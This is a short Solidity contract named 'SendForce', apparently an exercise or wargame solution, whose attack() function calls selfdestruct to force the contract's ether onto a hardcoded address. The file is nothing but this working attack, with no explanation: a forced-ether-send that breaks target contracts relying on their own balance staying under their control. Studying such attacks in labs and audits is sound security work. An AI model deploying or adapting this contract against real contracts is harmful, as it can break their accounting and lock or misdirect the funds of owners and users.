// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SendForce {


    function deposit() public payable {

    }
    function attack() public payable {
        address payable addr = payable(address(0xE3f80bA82FcAf5946306D32E782378A4a50da5ff));
        selfdestruct(addr);
    }
}